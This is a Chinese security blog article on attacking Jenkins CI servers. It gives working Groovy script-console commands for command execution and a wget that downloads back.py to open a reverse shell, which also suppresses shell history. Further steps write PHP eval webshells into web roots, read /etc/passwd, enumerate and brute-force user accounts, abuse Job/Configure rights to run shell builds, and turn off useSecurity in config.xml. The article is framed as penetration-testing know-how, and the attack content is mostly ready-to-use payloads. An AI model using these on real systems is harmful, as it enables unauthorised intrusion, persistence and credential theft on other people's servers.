

知其一不知其二之Jenkins Hacking - SecPulse.COM | 安全脉搏
 https://www.secpulse.com/archives/2166.html

本文首发安全脉搏 感谢大王叫我来巡山 的投递 转载请注明来源
大多安全工作者听到jenkins都会知道有个未授权的命令执行
但是如果Script页面要授权才能访问呢 或者你的用户没有Overall/RunScripts权限呢
抱着提出问题-->测试问题-->解决问题的思路有了这篇文章
shot_jenkins
 
 
 
 
 
 
 
 
 
由于版本众多 也不用下载本地测了 直接在内网找到六个
 
jenkins_inner
 
 
 
 
截止发稿 Jenkins新版本为(1.589)
一、 知其一的Jenkins未授权访问可执行命令

 
http://www.secpulse.com:8080/manage
http://www.secpulse.com:8080/script
默认是8080端口 未授权访问就是任意用户都能访问 都能执行命令
jenkins_1
 
 
1） println "ifconfig -a".execute().text  执行一些系统命令

 
老外比较喜欢这样用：
def sout = new StringBuffer(), serr = new StringBuffer()

def proc = '[INSERT COMMAND]'.execute()

proc.consumeProcessOutput(sout, serr)

proc.waitForOrKill(1000)

println "out> $sout err> $serr"
 
 
2） 直接wget下载back.py反弹shell

 
println "wget http://xxx.secpulse.com/tools/back.py -P /tmp/".execute().text

println "python /tmp/back.py 10.1.1.111 8080".execute().text
 
back.py里面已经有了HISTFILE代码，会自动去掉各种history记录，确保shell断掉的时候不会被记录到.bash_history里面
back.py不需要root权限
jenkins_reverse_shell
 
 
3） 不想反弹试试Terminal Plugin

可以搜索安装Terminal Plugin
Terminal Plugin
https://wiki.jenkins-ci.org/display/JENKINS/Terminal+Plugin
jenkins_terminal
不想提权的话 还是蛮好用的终端插件 谁用谁知道~
二、不知其二之多种方式写shell

有时候其他端口有web，我们可以查看nginx/apache配置或者结合phpinfo写入webshell
 
尝试几次失败后开始翻阅Groovy  Script语法
The web site for Groovy is http://groovy.codehaus.org/
Groovy is a weakly-typed scripting language based on Java.
 
1)Groovy既然是基于Java的弱类型语言 那么先稍微提提它的语法
def name = 'Joe'

println "Hello $name"

//Hello Joe

 

def name = 'Joe'

println "Number of letters in $name is ${name.size( )}"

//Number of letters in Joe is 3

 

//Groovy I/O 文件读写

 
读文件

text = new File("/tmp/back.py").getText();

 
//eachLine -- 打开和读取文件的每一行

new File("/tmp/back.py").eachLine { 

println it;

}

//readLines

lineList = new File("/tmp/back.py").readLines();

lineList.each { 

println it.toUpperCase();

}

 

write轻轻松松写文件

new File("/tmp/1.php").write('Hello SecPulse');

 

多行写入

new File("/tmp/1.php").write("""

This is

just a test file

to play with

""");
 
 
2)几种写webshell的错误写法：

println "echo \'<?php @eval($_POST[c6md])?>\' > /var/www/html/media.php".execute().text

println "echo '<?php @eval(\$_POST[c6md])?>\' > /var/www/html/media.php ".execute().text

new File("/tmp/1.php").write("<?php @eval($_POST[s3cpu1se]);?>");

groovy.lang.MissingPropertyException: No such property: _POST for class: Script1

new File("/tmp/1.php").write("<?php @eval($\_POST[s3cpu1se]);?>");

new File("/tmp/1.php").write("<?php @eval(\$\_POST[s3cpu1se]);?>");
 
 
3)脑洞开 多种写webshell方法

① wget写webshell

println "wget http://shell.secpulse.com/data/t.txt -o /var/www/html/media.php".execute().text

②

new File("/var/www/html/media.php").write('<?php @eval($_POST[s3cpu1se]);?>');

③

def webshell = '<?php @eval($_POST[s3cpu1se]);?>'

new File("/var/www/html/media.php").write("$webshell");

 

④追加法写webshell

def execute(cmd) {

def proc =  cmd.execute()

proc.waitFor()

}

execute( [ 'bash', '-c', 'echo -n "<?php @eval($" > /usr/local/nginx_1119/html/media.php' ] )

execute( [ 'bash', '-c', 'echo "_POST[s3cpu1se]);?>" >> /usr/local/nginx_1119/html/media.php' ] )

//参数-n 不要在最后自动换行
 
jenkins_webshell
 
Result: 0 表示成功写入
Result: 1 表示目录不存在或者权限不足 写入失败
Result: 2 表示构造有异常 写入失败
 
Hudson（jenkins类似）找"脚本命令行"
hudson
 
 
 
 
 
 
 
 
 
 
 
执行Groovy代码，读取服务器本地/etc/passwd文件：
try{

text = new File("/etc/passwd").getText();

out.print text

} catch(Exception e){

}
 
三、高逼格的Powershell&msf

https://github.com/samratashok/nishang
http://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console
http://www.labofapenetrationtester.com/2014/06/hacking-jenkins-servers.html
jenkins_msf_3
 
nishang是一个powershell脚本集 msf上面有jenkins对应的exploit 感觉都没必要
四、登录认证的突破

jenkins可以对每个用户分配不同的权限，如Overall/RunScripts或者Job/Configure权限
user_config_2
 
 
1）某些版本匿名用户可以访问asynchPeople 可爆破密码
（通常很多密码跟用户名一样或者是其他弱口令(top1000)，尤其是内网）
 
//用户列表：包含所有已知“用户”，包括当前安全域中的登录ID和在变更记录的提交信的息里的人
http://jenkins.secpulse.com:8080/asynchPeople/
jenkins_asynchPeople
 
所有构建(builds)
http://jenkins.secpulse.com:8080/view/All/builds
可以导出为XML
http:// jenkins.secpulse.com:8080/view/All/cc.xml
userContent(一般就一个readme):
http:// jenkins.secpulse.com:8080/userContent/
Computers:
http:// jenkins.secpulse.com:8080/computer/
jenkins_computer
 
2） 熟练的猜密码
根据这些用户名 熟练的猜密码 我们的目标就是要一个有命令执行权限的用户（最好是这样，但也不苛求）
有时候是域认证的用户 爆破立马触发各种邮件报警 显然就不理智 端详猜密码是个绝技~
3） 构造精准字典，来爆破
最好是构造精准的字典 也可以是top1000之类的弱口令
jenkins_burp
爆破Payload里面的json串可以删除
主要根据location判断爆破成功与否
 
五、低权限用户命令执行突破

 
不小心猜了个用户 没有执行权限 但是有job查看和configure权限
http://jenkins.secpulse.com:8080/job/Job1/configure
jenkins_execute_shell_1
 
新加一个Execute Shell添加command  （win平台用Execute Windows batch command）

Cat /etc/passwd

Apply

添加左上侧 立即构建

Build History看到历史BuildId

右键

控制台输出

http://jenkins.secpulse.com:8080/job/Job1/300/console

纯文本方式

http://jenkins.secpulse.com:8080/job/Job1/300/consoleText
 
jenkins_execute_shell_3
 
 
 
 
 
 
 
 
 
 
 
 
 
 
jenkins_execute_shell_2
 
老外也有提及：http://www.labofapenetrationtester.com/2014/08/script-execution-and-privilege-esc-jenkins.html
 
六、asynchPeople等不能访问时候的突破

 
快速定位用户有妙招
1） 如果jobs能访问的话 各种翻jobs 会看到启动用户
jenkins_finduser_1
 
 
 
 
 
 
 
 
 
 
2） 如果不能 那么启用/user/xxx/暴力模式
如果存在

 
 
 
 
 
 
 
 
 
 
 
如果不存在
jenkins_finduser_3
 
 
 
 
 
 
 
 
突破用户回到上述的四和五~
七、关于几个配置和加密

 
1） 根目录下的关键配置config.xml
① 如果配置不好的话 容易导致config.xml直接下载
http:// jenkins.secpulse.com:8080/config.xml
②[useSecurity]true[/useSecurity] 改为false的话就可以未授权访问了
jenkins_config
2） 每个用户目录下面的config.xml
passHash使用了Java的强加密方式jbcrypt
jenkins_config_2
 
pentest工作就是大部分自动化 快速找到安全短板 譬如st2，譬如弱口令，譬如本文的jenkins命令执行，快速突破进内网完成测试任务。安全运维人员则必须修补每一个缺口，重视每一块短板，紧跟每一次安全漏洞披露。以上是一些拙见，欢迎交流~
 
Tags: .bash_history、asynchPeople、back.py、consumeProcessOutput、Execute Shell、Groovy、Hudson、jenkins、manage、nishang、Overall、RunScripts、s3cpu1se、script、userContent、useSecurity